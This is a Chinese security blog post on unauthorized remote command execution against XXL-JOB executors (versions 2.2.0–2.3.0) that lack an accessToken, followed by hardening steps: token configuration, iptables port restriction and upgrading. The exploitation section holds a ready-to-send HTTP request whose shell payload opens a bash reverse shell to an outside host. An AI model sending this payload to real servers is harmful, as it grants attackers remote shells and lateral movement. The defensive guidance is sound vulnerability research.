#  漏洞研究(7)：XXL-JOB执行器未授权访问漏洞（RESTful API）   
原创 罗锦海  OneMoreThink   2025-05-13 16:00  
  
1. 组件介绍  
  
1. 原理与危害  
  
1. 影响版本  
  
1. 利用方式  
  
1. 加固措施  
  
1. 开启身份认证  
  
1. 限制端口访问  
  
1. 升级至安全版本  
  
## 1. 组件介绍  
  
XXL-JOB是一个分布式**任务调度**  
平台，分为调度中心和执行器两部分。  
  
在调度中心添加执行器后，调度中心可以对执行器进行命令执行，属于集权系统，可以帮助攻击者批量获取服务器权限。  
  
同时，通过调度中心横向到执行器，往往可以帮助攻击者实现跨网横移，这在网络策略严格的环境中具有较大价值。  
## 2. 原理与危害  
  
调度中心使用RESTful API对执行器进行调度通信时，可以使用accessToken向执行器证明自己的身份。  
  
如果没有配置accessToken，任何人都能对执行器发起调度通信，对执行器所在的服务器进行任意命令执行，从而获得执行器所在服务器的权限。  
## 3. 影响版本  
  
受影响版本是2.2.0 <= XXL-JOB <= 2.3.0  
，具体如下：  
1. 2.2.0  
  
1. 2.3.0  
  
## 4. 利用方式  
```
POST /run HTTP/1.1Host: 10.58.81.107:9999Content-Length: 383{  "jobId": 1,  "executorHandler": "demoJobHandler",  "executorParams": "demoJobHandler",  "executorBlockStrategy": "COVER_EARLY",  "executorTimeout": 0,  "logId": 1,  "logDateTime": 1745646241,  "glueType": "GLUE_SHELL",  "glueSource": "bash -i >& /dev/tcp/10.58.81.119/8888 0>&1",  "glueUpdatetime": 1745646241,  "broadcastIndex": 0,  "broadcastTotal": 0}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91yphAXTXq2Y53BSM7rlLzW9nkR7Feib9f83mh3RJbtVk4FoNvgFkEZIE9JVhEKpQiau3XEJURUrSXA/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91yphAXTXq2Y53BSM7rlLzWqrKEBevcaUkRm8zqXYhSyo6KeIagXhtLzp3KibBiaTM319EfPRNW8lJg/640?from=appmsg "")  
## 5. 加固措施  
  
可参考XXL-JOB作者恨铁不成钢的防护建议：[XXL JOB 未授权访问致远程命令执行 "漏洞" 声明](https://mp.weixin.qq.com/s?__biz=MzAwMTQwMjE0OA==&mid=2247483841&idx=1&sn=3f41c011f0709a644e1d1accbb1905b6&scene=21#wechat_redirect)  
  
### 5.1 开启身份认证  
  
配置accessToken，开启身份认证，**调度中心和执行器**  
的值需保持一致。  
  
accessToken在调度中心的配置文件是xxl-job-admin/src/main/resources/application.properties  
，配置项是xxl.job.accessToken=  
。  
  
accessToken在执行器的配置文件是xxl-job-executor-samples/xxl-job-executor-sample-springboot/src/main/resources/application.properties  
，配置项是xxl.job.accessToken=  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91yphAXTXq2Y53BSM7rlLzWAJxAVUd62bvqn27ZaYeBvwQUI3uWtfdlibv80IDr2kypcyNiczsIA1RQ/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91yphAXTXq2Y53BSM7rlLzWNibVcG6Xt9JQJjyliaZWvLExgFotbQSY9Y9HrYjUTcNPI2t0fUibV5hqg/640?from=appmsg "")  
  
例如将accessToken的值修改为OneMoreThink666666：  
```
cd /usr/local/xxl-job-2.2.0sed -i 's/xxl.job.accessToken=/xxl.job.accessToken=OneMoreThink666666/g' /usr/local/xxl-job-2.2.0/xxl-job-admin/src/main/resources/application.propertiessed -i 's/xxl.job.accessToken=/xxl.job.accessToken=OneMoreThink666666/g' /usr/local/xxl-job-2.2.0/xxl-job-executor-samples/xxl-job-executor-sample-springboot/src/main/resources/application.properties
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91yphAXTXq2Y53BSM7rlLzWKNbxYJ3tmb0of32LCuLb3xF2rLlCshibCwrROrzU0IfOBUTSqJEiaPow/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91yphAXTXq2Y53BSM7rlLzWXFDPALogl2G64QSMxVG3ScoOoic552r0NTHIrvbamFJ1qZtrmSzzAmw/640?from=appmsg "")  
  
然后重新打包与部署：  
```
### 打包cd /usr/local/xxl-job-2.2.0mvn clean package## 部署调度中心和执行器java -jar xxl-job-admin/target/xxl-job-admin-2.2.0.jar &java -jar xxl-job-executor-samples/xxl-job-executor-sample-springboot/target/xxl-job-executor-sample-springboot-2.2.0.jar
```  
  
再次对执行器进行未授权任意代码执行，如果报错The access token is wrong  
，说明漏洞修复成功。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91yphAXTXq2Y53BSM7rlLzWjMpHvcJLB85J71DpvZzX9oLzBASktiaWJkI8RiaMAoeloB5TJX0kPzSw/640?from=appmsg "")  
### 5.2 限制端口访问  
  
在**执行器所在的服务器**  
中配置本地防火墙，只允许调度中心访问执行器的9999端口。  
```
# 如果担心已有规则干扰，可将允许规则插入到链的顶部。# 即时调度中心和执行器在同一台服务器中，该命令不会影响调度中心对执行器的正常通信。iptables -I INPUT 1 -p tcp -s 10.58.81.107 --dport 9999 -j ACCEPT# 拒绝其他所有IP访问9999端口iptables -A INPUT -p tcp --dport 9999 -j DROP# 永久保存规则（CentOS中）yum install iptables-services -y && service iptables save && systemctl enable iptables
```  
  
再次对执行器进行未授权任意代码执行，如果没有响应，连接失败，说明漏洞修复成功。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91yphAXTXq2Y53BSM7rlLzW47N7qmDweiby5BLbEorbBDorKsbibGAAZuAlY7eOWVNVSSIY525rrZzQ/640?from=appmsg "")  
### 5.3 升级至安全版本  
  
建议升级至2.4.1及以上版本。  
  
